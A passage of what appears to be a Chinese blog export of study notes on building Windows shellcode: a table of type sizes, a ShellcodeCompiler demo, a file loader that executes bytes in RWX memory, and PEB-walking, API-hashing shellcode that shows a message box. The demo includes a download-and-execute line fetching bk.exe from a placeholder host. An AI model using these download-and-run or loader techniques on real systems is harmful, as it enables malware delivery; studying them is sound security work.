0;\n}\n```\n稍微修改了一点，使用**x64**位编译就可以生成**64位shellcode**，使用**x32**就能生成32位**shellcode**。\n\n使用了**hash函数名**的方式去找API，不用开那么大栈空间\n\n总结一下：\n\n类似`memcpy、strlen、strcat`等等常用函数，都自行实现，Shellcode的第一个函数要写在开始处。\n\nC++ 中字符数组定义格式有下面三种\n\n```c++\n    const char* str1 = \"I am Str1!\";\n\tchar str2[] = \"I am Str2!\";\n\tchar str3[] = { 'H','e','l','l','o','.','W','o','l','r','d','!',0 };\n```\n前面两种都是将字符串保存在`rdata`段中，第三种方式是将字符串保存在栈中，最后的0表示'\\0',如果没有结束标志，可能会操作到栈后面的数据。","slug":"自动化ShellCode","published":1,"date":"2020-03-18T01:26:39.539Z","updated":"2020-03-18T01:53:38.444Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw63c002bccuqjikg0suc","content":"<h2 id=\"思路：\"><a href=\"#思路：\" class=\"headerlink\" title=\"思路：\"></a>思路：</h2><p>学习来源<a href=\"https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-shellcode%E7%9A%84%E6%8F%90%E5%8F%96%E4%B8%8E%E6%B5%8B%E8%AF%95/\" target=\"_blank\" rel=\"noopener\">3gstudent</a></p>\n<p>总结<code>3gstudent</code>的两篇文章</p>\n<blockquote>\n<p>小知识</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th align=\"center\">类型</th>\n<th align=\"center\">32位大小</th>\n<th align=\"center\">64位大小</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">char</td>\n<td align=\"center\">1个字节</td>\n<td align=\"center\">1个字节</td>\n</tr>\n<tr>\n<td align=\"center\">char*（即指针变量）</td>\n<td align=\"center\">4个字节</td>\n<td align=\"center\">8个字节</td>\n</tr>\n<tr>\n<td align=\"center\">short int</td>\n<td align=\"center\">2个字节</td>\n<td align=\"center\">2个字节</td>\n</tr>\n<tr>\n<td align=\"center\">int</td>\n<td align=\"center\">4个字节</td>\n<td align=\"center\">4个字节</td>\n</tr>\n<tr>\n<td align=\"center\">unsigned int</td>\n<td align=\"center\">4个字节</td>\n<td align=\"center\">4个字节</td>\n</tr>\n<tr>\n<td align=\"center\">float</td>\n<td align=\"center\">4个字节</td>\n<td align=\"center\">4个字节</td>\n</tr>\n<tr>\n<td align=\"center\">double</td>\n<td align=\"center\">8个字节</td>\n<td align=\"center\">8个字节</td>\n</tr>\n<tr>\n<td align=\"center\">long</td>\n<td align=\"center\">4个字节</td>\n<td align=\"center\">8个字节</td>\n</tr>\n<tr>\n<td align=\"center\">long long</td>\n<td align=\"center\">8个字节</td>\n<td align=\"center\">8个字节</td>\n</tr>\n<tr>\n<td align=\"center\">unsigned long</td>\n<td align=\"center\">4个字节</td>\n<td align=\"center\">8个字节</td>\n</tr>\n</tbody></table>\n<h2 id=\"shellcode-生成的三种方法\"><a href=\"#shellcode-生成的三种方法\" class=\"headerlink\" title=\"shellcode 生成的三种方法\"></a>shellcode 生成的三种方法</h2><h3 id=\"1-手工\"><a href=\"#1-手工\" class=\"headerlink\" title=\"1.手工\"></a>1.手工</h3><p>可以先利用vs生成exe，运行时去拿汇编出来，这种方式和手写汇编差不多，需要构造各种变量，不推荐使用</p>\n<h3 id=\"2-使用自动化工具\"><a href=\"#2-使用自动化工具\" class=\"headerlink\" title=\"2.使用自动化工具\"></a>2.使用自动化工具</h3><p><a href=\"https://github.com/NytroRST/ShellcodeCompiler\" target=\"_blank\" rel=\"noopener\">shellcode compiler</a><br>使用的时候下载release程序，生成shellcode就能用。目前已经支持平台</p>\n<blockquote>\n<p>Windows (x86 and x64) and Linux (x86 and x64)</p>\n</blockquote>\n<p>使用方法：给了很多例子，这里说明一个Demo</p>\n<pre><code class=\"c++\">    function URLDownloadToFileA(&quot;urlmon.dll&quot;);     \n    //等于GetProcAddress(LoadLibraryA(&quot;urlmon.dll&quot;), &quot;URLDownloadToFileA&quot;);\n    function WinExec(&quot;kernel32.dll&quot;);\n    function ExitProcess(&quot;kernel32.dll&quot;);\n\n    URLDownloadToFileA(0,&quot;https://site.com/bk.exe&quot;,&quot;bk.exe&quot;,0,0);    // 直接调用api即可\n    WinExec(&quot;bk.exe&quot;,0);\n    ExitProcess(0);</code></pre>\n<p>将上面的保存为sourse.txt，然后生成shellcode即可</p>\n<p>命令详见github</p>\n<p>生成的shellcode 加-t命令可以测试，也可以自己写代码加载到内存中测试</p>\n<p>下面时我的测试代码</p>\n<pre><code class=\"c++\">#include &lt;iostream&gt;\n#include &lt;windows.h&gt;\nusing namespace std;\nsize_t GetSize(LPSTR szFilePath)\n{\n    size_t Size_File = 0;\n    FILE* fp;\n    fopen_s(&amp;fp, szFilePath, &quot;rb&quot;);\n    fseek(fp, 0, SEEK_END);\n    Size_File = ftell(fp);\n    rewind(fp);\n    fclose(fp);\n    return Size_File;\n}\n\nint main()\n{\n    char File_path[MAX_PATH] = { 0, };\n#ifdef _WIN64\n    cout &lt;&lt; &quot;Input 64bit Shellcode:&quot;;\n#else\n    cout &lt;&lt; &quot;Input 32bit Shellcode:&quot;;\n#endif\n    cin &gt;&gt; File_path;\n    if (*File_path == NULL){return -1;}\n    LPVOID lpBuffer = NULL;\n    size_t Shellcode_Size = GetSize(File_path);\n    lpBuffer = VirtualAlloc(0, Shellcode_Size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    if (!lpBuffer){return -1;}\n    FILE *fp;\n    fopen_s(&amp;fp, File_path, &quot;rb&quot;);\n    fread_s(lpBuffer, Shellcode_Size, 1, Shellcode_Size, fp);\n    fclose(fp);\n\n    (*(int(*)())lpBuffer)();//调用该函数\n\n    VirtualFree(lpBuffer, Shellcode_Size, MEM_DECOMMIT);\n    return 0;\n}\n</code></pre>\n<h3 id=\"3-使用Visual-Studio生成Shellcode\"><a href=\"#3-使用Visual-Studio生成Shellcode\" class=\"headerlink\" title=\"3.使用Visual Studio生成Shellcode\"></a>3.使用Visual Studio生成Shellcode</h3><p> <strong>环境</strong></p>\n<p>Visual Studio 2019（其他本版都行）</p>\n<ul>\n<li>使用release生成</li>\n<li>禁用优化</li>\n<li>禁用安全检测（/GS-）</li>\n</ul>\n<p>核心思路，不要使用全局变量，常见的字符串操作都自己写函数</p>\n<p>代码参考3gstudent</p>\n<pre><code class=\"c++\">#include &lt;windows.h&gt;\n#include &lt;Winternl.h&gt;\n#include &lt;stdio.h&gt;\n\n#pragma optimize( &quot;&quot;, off ) \nvoid shell_code();\nHANDLE GetKernel32Handle();\nBOOL __ISUPPER__(__in CHAR c);\nCHAR __TOLOWER__(__in CHAR c);\nUINT __STRLEN__(__in LPSTR lpStr1);\nUINT __STRLENW__(__in LPWSTR lpStr1);\nLPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2);\nINT __STRCMPI__(__in LPSTR lpStr1, __in LPSTR lpStr2);\nINT __STRNCMPIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2, __in DWORD dwLen);\nLPVOID __MEMCPY__(__in LPVOID lpDst, __in LPVOID lpSrc, __in DWORD dwCount);\nUINT __CalcHash__(__in LPVOID lpStr);\n\ntypedef FARPROC(WINAPI* GetProcAddressAPI)(HMODULE, LPCSTR);\ntypedef HMODULE(WINAPI* LoadLibraryWAPI)(LPCWSTR);\ntypedef ULONG(WINAPI* MESSAGEBOXAPI)(HWND, LPCSTR, LPWSTR, ULONG);\n\n\nvoid shell_code() {\n\n    LoadLibraryWAPI    loadlibrarywapi = 0;\n    GetProcAddressAPI getprocaddressapi = 0;\n    MESSAGEBOXAPI messageboxapi = 0;\n\n    wchar_t struser32[] = { L&#39;u&#39;, L&#39;s&#39;, L&#39;e&#39;, L&#39;r&#39;, L&#39;3&#39;,L&#39;2&#39;, L&#39;.&#39;, L&#39;d&#39;, L&#39;l&#39;, L&#39;l&#39;, 0 };\n    char MeassageboxA_api[] = { &#39;M&#39;, &#39;e&#39;, &#39;s&#39;, &#39;s&#39;, &#39;a&#39;, &#39;g&#39;, &#39;e&#39;, &#39;B&#39;, &#39;o&#39;, &#39;x&#39;, &#39;A&#39;, 0 };\n    char MeassageText[] = { &#39;H&#39;,&#39;e&#39;,&#39;l&#39;,&#39;l&#39;,&#39;o&#39;,&#39;.&#39;,&#39;W&#39;,&#39;o&#39;,&#39;l&#39;,&#39;r&#39;,&#39;d&#39;,&#39;!&#39;,0 };\n\n    HANDLE hKernel32 = GetKernel32Handle();\n    if (hKernel32 == INVALID_HANDLE_VALUE) {\n        return;\n    }\n    LPBYTE lpBaseAddr = (LPBYTE)hKernel32;\n    PIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER)lpBaseAddr;\n    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(lpBaseAddr + lpDosHdr-&gt;e_lfanew);\n    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(lpBaseAddr + pNtHdrs-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n\n    LPDWORD pNameArray = (LPDWORD)(lpBaseAddr + pExportDir-&gt;AddressOfNames);\n    LPDWORD pAddrArray = (LPDWORD)(lpBaseAddr + pExportDir-&gt;AddressOfFunctions);\n    LPWORD pOrdArray = (LPWORD)(lpBaseAddr + pExportDir-&gt;AddressOfNameOrdinals);\n    //CHAR strLoadLibraryA[] = { &#39;L&#39;, &#39;o&#39;, &#39;a&#39;, &#39;d&#39;, &#39;L&#39;, &#39;i&#39;, &#39;b&#39;, &#39;r&#39;, &#39;a&#39;, &#39;r&#39;, &#39;y&#39;, &#39;W&#39;, 0x0 };\n    //CHAR strGetProcAddress[] = { &#39;G&#39;, &#39;e&#39;, &#39;t&#39;, &#39;P&#39;, &#39;r&#39;, &#39;o&#39;, &#39;c&#39;, &#39;A&#39;, &#39;d&#39;, &#39;d&#39;, &#39;r&#39;, &#39;e&#39;, &#39;s&#39;, &#39;s&#39;, 0x0 };\n    UINT HashrLoadLibraryA = 0x6fffef88;\n    UINT HashrGetProcAddress = 0x3f8aaa7e;\n\n    for (UINT i = 0; i &lt; pExportDir-&gt;NumberOfNames; i++) {\n        LPSTR pFuncName = (LPSTR)(lpBaseAddr + pNameArray[i]);\n        //if (!__STRCMPI__(pFuncName, strGetProcAddress)) {\n        if (__CalcHash__(pFuncName) == HashrGetProcAddress) {\n            getprocaddressapi = (GetProcAddressAPI)(lpBaseAddr + pAddrArray[pOrdArray[i]]);\n        }\n        //else if (!__STRCMPI__(pFuncName, strLoadLibraryA)) {\n        else if (__CalcHash__(pFuncName) == HashrLoadLibraryA) {\n            loadlibrarywapi = (LoadLibraryWAPI)(lpBaseAddr + pAddrArray[pOrdArray[i]]);\n        }\n        if (getprocaddressapi != nullptr &amp;&amp; loadlibrarywapi != nullptr) {\n            messageboxapi = (MESSAGEBOXAPI)getprocaddressapi(loadlibrarywapi(struser32), MeassageboxA_api);\n            messageboxapi(NULL, MeassageText, NULL, 0);\n            return;\n        }\n    }\n}\n\ninline BOOL __ISUPPER__(__in CHAR c) {\n    return (&#39;A&#39; &lt;= c) &amp;&amp; (c &lt;= &#39;Z&#39;);\n};\ninline CHAR __TOLOWER__(__in CHAR c) {\n    return __ISUPPER__(c) ? c - &#39;A&#39; + &#39;a&#39; : c;\n};\n\nUINT __STRLEN__(__in LPSTR lpStr1)\n{\n    UINT i = 0;\n    while (lpStr1[i] != 0x0)\n        i++;\n    return i;\n}\n\nUINT __STRLENW__(__in LPWSTR lpStr1)\n{\n    UINT i = 0;\n    while (lpStr1[i] != L&#39;\\0&#39;)\n        i++;\n    return i;\n}\n\nLPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2)\n{\n    CHAR c = __TOLOWER__(((PCHAR)(lpStr2++))[0]);\n    if (!c)\n        return lpStr1;\n    UINT dwLen = __STRLENW__(lpStr2);\n    do\n    {\n        CHAR sc;\n        do\n        {\n            sc = __TOLOWER__(((PCHAR)(lpStr1)++)[0]);\n            if (!sc)\n                return NULL;\n        } while (sc != c);\n    } while (__STRNCMPIW__(lpStr1, lpStr2, dwLen) != 0);\n    return (lpStr1 - 1); // FIXME -2 ?\n}\n\nINT __STRCMPI__(\n    __in LPSTR lpStr1,\n    __in LPSTR lpStr2)\n{\n    int  v;\n    CHAR c1, c2;\n    do\n    {\n        c1 = *lpStr1++;\n        c2 = *lpStr2++;\n        // The casts are necessary when pStr1 is shorter &amp; char is signed \n        v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);\n    } while ((v == 0) &amp;&amp; (c1 != &#39;\\0&#39;) &amp;&amp; (c2 != &#39;\\0&#39;));\n    return v;\n}\n\nINT __STRNCMPIW__(\n    __in LPWSTR lpStr1,\n    __in LPWSTR lpStr2,\n    __in DWORD dwLen)\n{\n    int  v;\n    CHAR c1, c2;\n    do {\n        dwLen--;\n        c1 = ((PCHAR)lpStr1++)[0];\n        c2 = ((PCHAR)lpStr2++)[0];\n        /* The casts are necessary when pStr1 is shorter &amp; char is signed */\n        v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);\n    } while ((v == 0) &amp;&amp; (c1 != 0x0) &amp;&amp; (c2 != 0x0) &amp;&amp; dwLen &gt; 0);\n    return v;\n}\n\nLPSTR __STRCAT__(\n    __in LPSTR    strDest,\n    __in LPSTR strSource)\n{\n    LPSTR d = strDest;\n    LPSTR s = strSource;\n    while (*d) d++;\n    do { *d++ = *s++; } while (*s);\n    *d = 0x0;\n    return strDest;\n}\n\nLPVOID __MEMCPY__(\n    __in LPVOID lpDst,\n    __in LPVOID lpSrc,\n    __in DWORD dwCount)\n{\n    LPBYTE s = (LPBYTE)lpSrc;\n    LPBYTE d = (LPBYTE)lpDst;\n    while (dwCount--)\n        * d++ = *s++;\n    return lpDst;\n}\n\nUINT __CalcHash__(\n    __in LPVOID lpStr\n)\n{\n    UINT ApiHash = 0;\n    LPBYTE s = (LPBYTE)lpStr;\n    do\n    {\n        ApiHash = (ApiHash &lt;&lt; 7) + (ApiHash &gt;&gt; 25) + *s;\n    } while (*s++);\n    return ApiHash;\n}\n\nHANDLE GetKernel32Handle() {\n    HANDLE hKernel32 = INVALID_HANDLE_VALUE;\n#ifdef _WIN64\n    PPEB lpPeb = (PPEB)__readgsqword(0x60);\n#else\n    PPEB lpPeb = (PPEB)__readfsdword(0x30);\n#endif\n    PLIST_ENTRY pListHead = &amp;lpPeb-&gt;Ldr-&gt;InMemoryOrderModuleList;\n    PLIST_ENTRY pListEntry = pListHead-&gt;Flink;\n    WCHAR strDllName[MAX_PATH];\n    WCHAR strKernel32[] = { &#39;k&#39;, &#39;e&#39;, &#39;r&#39;, &#39;n&#39;, &#39;e&#39;, &#39;l&#39;, &#39;3&#39;, &#39;2&#39;, &#39;.&#39;, &#39;d&#39;, &#39;l&#39;, &#39;l&#39;, L&#39;\\0&#39; };\n\n    while (pListEntry != pListHead) {\n        PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);\n        if (pModEntry-&gt;FullDllName.Length) {\n            DWORD dwLen = pModEntry-&gt;FullDllName.Length;\n            __MEMCPY__(strDllName, pModEntry-&gt;FullDllName.Buffer, dwLen);\n            strDllName[dwLen / sizeof(WCHAR)] = L&#39;\\0&#39;;\n            if (__STRSTRIW__(strDllName, strKernel32)) {\n                hKernel32 = pModEntry-&gt;DllBase;\n                break;\n            }\n        }\n        pListEntry = pListEntry-&gt;Flink;\n    }\n    return hKernel32;\n}\n\n//void __declspec(naked) END_SHELLCODE(void) {}\n\nvoid END_SHELLCODE(void) {}\n\nint main()\n{\n    shell_code();\n    FILE* output_file;\n#ifdef _WIN64\n    fopen_s(&amp;output_file, &quot;shellcode_x64.bin&quot;, &quot;wb&quot;);\n#else\n    fopen_s(&amp;output_file, &quot;shellcode_x32.bin&quot;, &quot;wb&quot;);\n#endif\n    fwrite(shell_code, (int)END_SHELLCODE - (int)shell_code, 1, output_file);\n    fclose(output_file);\n    return 0;\n}</code></pre>\n<p>稍微修改了一点，使用<strong>x64</strong>位编译就可以生成<strong>64位shellcode</strong>，使用<strong>x32</strong>就能生成32位<strong>shellcode</strong>。</p>\n<p>使用了<strong>hash函数名</strong>的方式去找API，不用开那么大栈空间</p>\n<p>总结一下：</p>\n<p>类似<code>memcpy、strlen、strcat</code>等等常用函数，都自行实现，Shellcode的第一个函数要写在开始处。</p>\n<p>C++ 中字符数组定义格式有下面三种</p>\n<pre><code class=\"c++\">    const char* str1 = &quot;I am Str1!&quot;;\n    char str2[] = &quot;I am Str2!&quot;;\n    char str3[] = { &#39;H&#39;,&#39;e&#39;,&#39;l&#39;,&#39;l&#39;,&#39;o&#39;,&#39;.&#39;,&#39;W&#39;,&#39;o&#39;,&#39;l&#39;,&#39;r&#39;,&#39;d&#39;,&#39;!&#39;,0 };</code></pre>\n<p>前面两种都是将字符串保存在<code>rdata</code>段中，第三种方式是将字符串保存在栈中，最后的0表示’\\0’,如果没有结束标志，可能会操作到栈后面的数据。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"思路：\"><a href=\"#思路：\" class=\"headerlink\" title=\"思路：\"></a>思路：</h2><p>学习来源<a href=\"https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-shellcode%E7%9A%84%E6%8F%90%E5%8F%96%E4%B8%8E%E6%B5%8B%E8%AF%95/\" target=\"_blank\" rel=\"noopener\">3gstudent</a></p>\n<p>总结<code>3gstudent</code>的两篇文章</p>\n<blockquote>\n<p>小知识</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th align=\"center\">类型</th>\n<th align=\"center\">32位大小</th>\n<th align=\"center\">64位大小</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">char</td>\n<td align=\"center\">1个字节</td>\n<td align=\"center\">1个字节</td>\n</tr>\n<tr>\n<td align=\"center\">char*（即指针变量）</td>\n<td align=\"center\">4个字节</td>\n<td align=\"center\">8个字节</td>\n</tr>\n<tr>\n<td align=\"center\">short int</td>\n<td align=\"center\">2个字节</td>\n<td align=\"center\">2个字节</td>\n</tr>\n<tr>\n<td align=\"center\">int</td>\n<td align=\"center\">4个字节</td>\n<td align=\"center\">4个字节</td>\n</tr>\n<tr>\n<td align=\"center\">unsigned int</td>\n<td align=\"center\">4个字节</td>\n<td align=\"center\">4个字节</td>\n</tr>\n<tr>\n<td align=\"center\">float</td>\n<td align=\"center\">4个字节</td>\n<td align=\"center\">4个字节</td>\n</tr>\n<tr>\n<td align=\"center\">double</td>\n<td align=\"center\">8个字节</td>\n<td align=\"center\">8个字节</td>\n</tr>\n<tr>\n<td align=\"center\">long</td>\n<td align=\"center\">4个字节</td>\n<td align=\"center\">8个字节</td>\n</tr>\n<tr>\n<td align=\"center\">long long</td>\n<td align=\"center\">8个字节</td>\n<td align=\"center\">8个字节</td>\n</tr>\n<tr>\n<td align=\"center\">unsigned long</td>\n<td align=\"center\">4个字节</td>\n<td align=\"center\">8个字节</td>\n</tr>\n</tbody></table>\n<h2 id=\"shellcode-生成的三种方法\"><a href=\"#shellcode-生成的三种方法\" class=\"headerlink\" title=\"shellcode 生成的三种方法\"></a>shellcode 生成的三种方法</h2><h3 id=\"1-手工\"><a href=\"#1-手工\" class=\"headerlink\" title=\"1.手工\"></a>1.手工</h3><p>可以先利用vs生成exe，运行时去拿汇编出来，这种方式和手写汇编差不多，需要构造各种变量，不推荐使用</p>\n<h3 id=\"2-使用自动化工具\"><a href=\"#2-使用自动化工具\" class=\"headerlink\" title=\"2.使用自动化工具\"></a>2.使用自动化工具</h3><p><a href=\"https://github.com/NytroRST/ShellcodeCompiler\" target=\"_blank\" rel=\"noopener\">shellcode compiler</a><br>使用的时候下载release程序，生成shellcode就能用。目前已经支持平台</p>\n<blockquote>\n<p>Windows (x86 and x64) and Linux (x86 and x64)</p>\n</blockquote>\n<p>使用方法：给了很多例子，这里说明一个Demo</p>\n<pre><code class=\"c++\">    function URLDownloadToFileA(&quot;urlmon.dll&quot;);     \n    //等于GetProcAddress(LoadLibraryA(&quot;urlmon.dll&quot;), &quot;URLDownloadToFileA&quot;);\n    function WinExec(&quot;kernel32.dll&quot;);\n    function ExitProcess(&quot;kernel32.dll&quot;);\n\n    URLDownloadToFileA(0,&quot;https://site.com/bk.exe&quot;,&quot;bk.exe&quot;,0,0);    // 直接调用api即可\n    WinExec(&quot;bk.exe&quot;,0);\n    ExitProcess(0);</code></pre>\n<p>将上面的保存为sourse.txt，然后生成shellcode即可</p>\n<p>命令详见github</p>\n<p>生成的shellcode 加-t命令可以测试，也可以自己写代码加载到内存中测试</p>\n<p>下面时我的测试代码</p>\n<pre><code class=\"c++\">#include &lt;iostream&gt;\n#include &lt;windows.h&gt;\nusing namespace std;\nsize_t GetSize(LPSTR szFilePath)\n{\n    size_t Size_File = 0;\n    FILE* fp;\n    fopen_s(&amp;fp, szFilePath, &quot;rb&quot;);\n    fseek(fp, 0, SEEK_END);\n    Size_File = ftell(fp);\n    rewind(fp);\n    fclose(fp);\n    return Size_File;\n}\n\nint main()\n{\n    char File_path[MAX_PATH] = { 0, };\n#ifdef _WIN64\n    cout &lt;&lt; &quot;Input 64bit Shellcode:&quot;;\n#else\n    cout &lt;&lt; &quot;Input 32bit Shellcode:&quot;;\n#endif\n    cin &gt;&gt; File_path;\n    if (*File_path == NULL){return -1;}\n    LPVOID lpBuffer = NULL;\n    size_t Shellcode_Size = GetSize(File_path);\n    lpBuffer = VirtualAlloc(0, Shellcode_Size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    if (!lpBuffer){return -1;}\n    FILE *fp;\n    fopen_s(&amp;fp, File_path, &quot;rb&quot;);\n    fread_s(lpBuffer, Shellcode_Size, 1, Shellcode_Size, fp);\n    fclose(fp);\n\n    (*(int(*)())lpBuffer)();//调用该函数\n\n    VirtualFree(lpBuffer, Shellcode_Size, MEM_DECOMMIT);\n    return 0;\n}\n</code></pre>\n<h3 id=\"3-使用Visual-Studio生成Shellcode\"><a href=\"#3-使用Visual-Studio生成Shellcode\" class=\"headerlink\" title=\"3.使用Visual Studio生成Shellcode\"></a>3.使用Visual Studio生成Shellcode</h3><p> <strong>环境</strong></p>\n<p>Visual Studio 2019（其他本版都行）</p>\n<ul>\n<li>使用release生成</li>\n<li>禁用优化</li>\n<li>禁用安全检测（/GS-）</li>\n</ul>\n<p>核心思路，不要使用全局变量，常见的字符串操作都自己写函数</p>\n<p>代码参考3gstudent</p>\n<pre><code class=\"c++\">#include &lt;windows.h&gt;\n#include &lt;Winternl.h&gt;\n#include &lt;stdio.h&gt;\n\n#pragma optimize( &quot;&quot;, off ) \nvoid shell_code();\nHANDLE GetKernel32Handle();\nBOOL __ISUPPER__(__in CHAR c);\nCHAR __TOLOWER__(__in CHAR c);\nUINT __STRLEN__(__in LPSTR lpStr1);\nUINT __STRLENW__(__in LPWSTR lpStr1);\nLPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2);\nINT __STRCMPI__(__in LPSTR lpStr1, __in LPSTR lpStr2);\nINT __STRNCMPIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2, __in DWORD dwLen);\nLPVOID __MEMCPY__(__in LPVOID lpDst, __in LPVOID lpSrc, __in DWORD dwCount);\nUINT __CalcHash__(__in LPVOID lpStr);\n\ntypedef FARPROC(WINAPI* GetProcAddressAPI)(HMODULE, LPCSTR);\ntypedef HMODULE(WINAPI* LoadLibraryWAPI)(LPCWSTR);\ntypedef ULONG(WINAPI* MESSAGEBOXAPI)(HWND, LPCSTR, LPWSTR, ULONG);\n\n\nvoid shell_code() {\n\n    LoadLibraryWAPI    loadlibrarywapi = 0;\n    GetProcAddressAPI getprocaddressapi = 0;\n    MESSAGEBOXAPI messageboxapi = 0;\n\n    wchar_t struser32[] = { L&#39;u&#39;, L&#39;s&#39;, L&#39;e&#39;, L&#39;r&#39;, L&#39;3&#39;,L&#39;2&#39;, L&#39;.&#39;, L&#39;d&#39;, L&#39;l&#39;, L&#39;l&#39;, 0 };\n    char MeassageboxA_api[] = { &#39;M&#39;, &#39;e&#39;, &#39;s&#39;, &#39;s&#39;, &#39;a&#39;, &#39;g&#39;, &#39;e&#39;, &#39;B&#39;, &#39;o&#39;, &#39;x&#39;, &#39;A&#39;, 0 };\n    char MeassageText[] = { &#39;H&#39;,&#39;e&#39;,&#39;l&#39;,&#39;l&#39;,&#39;o&#39;,&#39;.&#39;,&#39;W&#39;,&#39;o&#39;,&#39;l&#39;,&#39;r&#39;,&#39;d&#39;,&#39;!&#39;,0 };\n\n    HANDLE hKernel32 = GetKernel32Handle();\n    if (hKernel32 == INVALID_HANDLE_VALUE) {\n        return;\n    }\n    LPBYTE lpBaseAddr = (LPBYTE)hKernel32;\n    PIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER)lpBaseAddr;\n    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(lpBaseAddr + lpDosHdr-&gt;e_lfanew);\n    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(lpBaseAddr + pNtHdrs-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n\n    LPDWORD pNameArray = (LPDWORD)(lpBaseAddr + pExportDir-&gt;AddressOfNames);\n    LPDWORD pAddrArray = (LPDWORD)(lpBaseAddr + pExportDir-&gt;AddressOfFunctions);\n    LPWORD pOrdArray = (LPWORD)(lpBaseAddr + pExportDir-&gt;AddressOfNameOrdinals);\n    //CHAR strLoadLibraryA[] = { &#39;L&#39;, &#39;o&#39;, &#39;a&#39;, &#39;d&#39;, &#39;L&#39;, &#39;i&#39;, &#39;b&#39;, &#39;r&#39;, &#39;a&#39;, &#39;r&#39;, &#39;y&#39;, &#39;W&#39;, 0x0 };\n    //CHAR strGetProcAddress[] = { &#39;G&#39;, &#39;e&#39;, &#39;t&#39;, &#39;P&#39;, &#39;r&#39;, &#39;o&#39;, &#39;c&#39;, &#39;A&#39;, &#39;d&#39;, &#39;d&#39;, &#39;r&#39;, &#39;e&#39;, &#39;s&#39;, &#39;s&#39;, 0x0 };\n    UINT HashrLoadLibraryA = 0x6fffef88;\n    UINT HashrGetProcAddress = 0x3f8aaa7e;\n\n    for (UINT i = 0; i &lt; pExportDir-&gt;NumberOfNames; i++) {\n        LPSTR pFuncName = (LPSTR)(lpBaseAddr + pNameArray[i]);\n        //if (!__STRCMPI__(pFuncName, strGetProcAddress)) {\n        if (__CalcHash__(pFuncName) == HashrGetProcAddress) {\n            getprocaddressapi = (GetProcAddressAPI)(lpBaseAddr + pAddrArray[pOrdArray[i]]);\n        }\n        //else if (!__STRCMPI__(pFuncName, strLoadLibraryA)) {\n        else if (__CalcHash__(pFuncName) == HashrLoadLibraryA) {\n            loadlibrarywapi = (LoadLibraryWAPI)(lpBaseAddr + pAddrArray[pOrdArray[i]]);\n        }\n        if (getprocaddressapi != nullptr &amp;&amp; loadlibrarywapi != nullptr) {\n            messageboxapi = (MESSAGEBOXAPI)getprocaddressapi(loadlibrarywapi(struser32), MeassageboxA_api);\n            messageboxapi(NULL, MeassageText, NULL, 0);\n            return;\n        }\n    }\n}\n\ninline BOOL __ISUPPER__(__in CHAR c) {\n    return (&#39;A&#39; &lt;= c) &amp;&amp; (c &lt;= &#39;Z&#39;);\n};\ninline CHAR __TOLOWER__(__in CHAR c) {\n    return __ISUPPER__(c) ? c - &#39;A&#39; + &#39;a&#39; : c;\n};\n\nUINT __STRLEN__(__in LPSTR lpStr1)\n{\n    UINT i = 0;\n    while (lpStr1[i] != 0x0)\n        i++;\n    return i;\n}\n\nUINT __STRLENW__(__in LPWSTR lpStr1)\n{\n    UINT i = 0;\n    while (lpStr1[i] != L&#39;\\0&#39;)\n        i++;\n    return i;\n}\n\nLPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2)\n{\n    CHAR c = __TOLOWER__(((PCHAR)(lpStr2++))[0]);\n    if (!c)\n        return lpStr1;\n    UINT dwLen = __STRLENW__(lpStr2);\n    do\n    {\n        CHAR sc;\n        do\n        {\n            sc = __TOLOWER__(((PCHAR)(lpStr1)++)[0]);\n            if (!sc)\n                return NULL;\n        } while (sc != c);\n    } while (__STRNCMPIW__(lpStr1, lpStr2, dwLen) != 0);\n    return (lpStr1 - 1); // FIXME -2 ?\n}\n\nINT __STRCMPI__(\n    __in LPSTR lpStr1,\n    __in LPSTR lpStr2)\n{\n    int  v;\n    CHAR c1, c2;\n    do\n    {\n        c1 = *lpStr1++;\n        c2 = *lpStr2++;\n        // The casts are necessary when pStr1 is shorter &amp; char is signed \n        v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);\n    } while ((v == 0) &amp;&amp; (c1 != &#39;\\0&#39;) &amp;&amp; (c2 != &#39;\\0&#39;));\n    return v;\n}\n\nINT __STRNCMPIW__(\n    __in LPWSTR lpStr1,\n    __in LPWSTR lpStr2,\n    __in DWORD dwLen)\n{\n    int  v;\n    CHAR c1, c2;\n    do {\n        dwLen--;\n        c1 = ((PCHAR)lpStr1++)[0];\n        c2 = ((PCHAR)lpStr2++)[0];\n        /* The casts are necessary when pStr1 is shorter &amp; char is signed */\n        v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);\n    } while ((v == 0) &amp;&amp; (c1 != 0x0) &amp;&amp; 